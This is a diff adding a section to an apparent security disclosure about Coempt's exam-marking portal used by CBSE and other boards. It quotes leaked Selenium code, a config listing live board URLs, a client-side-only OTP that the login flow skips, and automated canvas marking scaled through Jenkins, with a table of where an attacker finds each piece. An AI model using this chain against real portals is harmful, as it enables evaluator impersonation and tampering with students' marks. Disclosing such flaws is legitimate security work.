@@ -93,6 +93,106 @@ pre code{background:none;padding:0;color:#e8e8e8}
 </ol>
 <p>The Gemini integration is notable: the automation code contains carefully crafted evaluation prompts that instruct the AI to assess handwritten answers against marking schemes. This is part of the <strong>automated quality assurance layer</strong> — not the primary marking system, but an AI review of evaluator consistency.</p>
 
+<h2>Why This Is a Disaster: Scriptable Portal + OTP Bypass</h2>
+
+<div style="background:#0d1117;border:1px solid #e94560;border-radius:8px;padding:16px;margin:16px 0">
+<h3 style="color:#e94560;margin-top:0">The Full Attack Chain — Proven by Coempt's Own Code</h3>
+<p>The leaked Selenium automation repo is not just a QA tool. It is a <strong>working proof-of-concept for a fully automated attack</strong> on the CBSE evaluation system. Here is how every piece fits together:</p>
+
+<h4>Step 1: Credentials from config.properties</h4>
+<p>The <code>config.properties</code> file parameterizes the entire attack. An attacker needs only change one value to target any board instance:</p>
+
+<pre style="background:#161b22;padding:12px;border-radius:4px;overflow-x:auto"><code># Switch between boards with a single config change
+login_name=osm                  # → targets https://cbse.onmark.co.in/cbseevalweb/
+# login_name=sctevt_live_result # → targets https://sctevtexams.in/sn20Yz
+# login_name=knr_live           # → targets https://knruhs.uonex.in/
+</code></pre>
+
+<p>URLs are resolved in <code>BrowserManager.java</code> via a <code>urlBasedLogin()</code> switch statement — every client instance has its entry. <strong>Portable by design.</strong></p>
+
+<h4>Step 2: OTP Is Client-Side Only — No Server Validation</h4>
+<p>Look at the login flow in <code>osm_Login_Page.java</code>:</p>
+
+<pre style="background:#161b22;padding:12px;border-radius:4px;overflow-x:auto"><code>// 1. Fill credentials
+sendKeys(OsmPom.getInstanceOsmLoginXP().userName, userName);
+sendKeys(OsmPom.getInstanceOsmLoginXP().password, password);
+sendKeys(OsmPom.getInstanceOsmLoginXP().schoolNo, schoolID);
+sendKeys(OsmPom.getInstanceOsmLoginXP().dob, dob);
+
+// 2. Click "Send OTP" button
+click(OsmPom.getInstanceOsmLoginXP().sendOTP);
+
+// 3. Wait for OTP to appear on page — as a visible input field
+explicitWait(OsmPom.getInstanceOsmLoginXP().otpShown, 30);
+
+// 4. If OTP is displayed, click Login — NO code reads or enters the OTP value
+if(OsmPom.getInstanceOsmLoginXP().otpShown.isDisplayed()) {
+    click(OsmPom.getInstanceOsmLoginXP().loginBtn);
+    // Success alert: "You have successfully logged in the OSM portal"
+}
+</code></pre>
+
+<p>The XPath locator for the OTP field confirms it's just a plain text input rendered client-side:</p>
+<pre style="background:#161b22;padding:12px;border-radius:4px;overflow-x:auto"><code>@FindBy(xpath = "//div/input[@class='form-input otp-input ng-untouched ng-pristine ng-valid']")
+public WebElement otpShown;
+</code></pre>
+
+<p><strong>The OTP is generated and displayed on the page itself</strong> — not sent via SMS, email, or any out-of-band channel. The Selenium code doesn't even need to read the OTP value. It simply waits for the element to appear, confirms it's visible, then clicks Login. This is a <strong>client-side-only pseudo-OTP</strong> that provides zero authentication security.</p>
+
+<h4>Step 3: Automated Canvas-Based Marking</h4>
+<p>Once authenticated, <code>osmMainAssessmentPage.java</code> automates the entire marking workflow:</p>
+
+<pre style="background:#161b22;padding:12px;border-radius:4px;overflow-x:auto"><code>// Navigate through every scanned answer sheet page
+List&lt;WebElement&gt; scannedPages = driver.findElements(By.xpath("..."));
+for (int pageNo = 1; pageNo <= scannedPages.size(); pageNo++) {
+    page.click();  // Select answer sheet page
+
+    // Interact with the marking canvas (HTML5 canvas element)
+    WebElement canvas = driver.findElement(By.id("canvas" + (i+2)));
+    new Actions(driver).contextClick(canvas).perform();  // Right-click
+
+    // Select mark value from context menu
+    List&lt;WebElement&gt; menuItems = driver.findElements(By.xpath("//div[contains(@class, 'context-menu')]//ul/li"));
+    ((JavascriptExecutor) driver).executeScript("arguments[0].click();", target);
+
+    // Simulate double-click to confirm mark allocation
+    js.executeScript(leftDblClickScript, canvas, x, y);  // Coordinate-based dblclick
+}
+</code></pre>
+
+<p>The marking interface uses HTML5 <code>&lt;canvas&gt;</code> elements with right-click context menus. The automation code <strong>programmatically clicks canvas elements at specific coordinates, selects mark values from context menus, and simulates double-clicks</strong> to confirm allocations — mimicking a human evaluator at machine speed.</p>
+
+<h4>Step 4: Scale with Jenkins CI</h4>
+<p>The test runner (<code>osm_Exceution.java</code>) is designed for <strong>Jenkins CI/CD execution</strong>:</p>
+
+<pre style="background:#161b22;padding:12px;border-radius:4px;overflow-x:auto"><code>@BeforeTest
+@Parameters({"TestMethod"})
+public void beforeTest(@Optional("") String testMethods) {
+    methodsToRun = Arrays.asList(testMethods.split(","));
+    // Running from Jenkins with TestMethod parameter
+}
+
+// Credentials fed via environment variables or Excel datasheets
+String filePath = System.getenv("Filepath");
+String loginName = System.getenv("Project_Login");
+String browser = System.getenv("Browser");
+</code></pre>
+
+<p>This means the full attack — login, OTP bypass, marking, submission — can be <strong>triggered from Jenkins with parameterized credentials</strong>. Feed a spreadsheet of evaluator accounts, and one CI job can sequentially log in as each evaluator, auto-mark answer sheets, and submit — all unattended.</p>
+
+<h4>Attack Scenario</h4>
+<table>
+<tr><th>What an attacker needs</th><th>Where to get it</th></tr>
+<tr><td>Evaluator username + password</td><td>Leaked in <code>config.properties</code> (pattern: <code>knr_live_username</code>, <code>sctevt_live_login_username</code>)</td></tr>
+<tr><td>Board URL</td><td><code>BrowserManager.urlBasedLogin()</code> — switch statement with all client URLs</td></tr>
+<tr><td>OTP</td><td>Not needed — generated client-side, appears on page automatically</td></tr>
+<tr><td>Marking logic</td><td>Canvas interaction code in <code>osmMainAssessmentPage.java</code> — right-click menus + coordinate clicks</td></tr>
+<tr><td>Scale mechanism</td><td>Jenkins CI parameterization — <code>@Parameters({"TestMethod"})</code>, env vars for Filepath/SheetName</td></tr>
+</table>
+
+<p><strong>In summary:</strong> The OTP is not a real OTP. The portal is fully scriptable. The vendor's own employees wrote and shipped the proof-of-concept attack code to a public GitHub repository. An attacker with a list of evaluator credentials (obtained from any of the <strong>multiple password leaks</strong> in the same repos) could use this exact code — with zero modifications beyond changing <code>login_name=osm</code> — to auto-evaluate answer sheets at scale.</p>
+</div>
+
 <h2>Finding 2: 30+ Board Subdomains from SSL Certificates</h2>
 <p>Certificate Transparency logs (<a href="https://crt.sh">crt.sh</a>) for <code>*.onmark.co.in</code> reveal the full client roster of Coempt's OSM platform:</p>
 
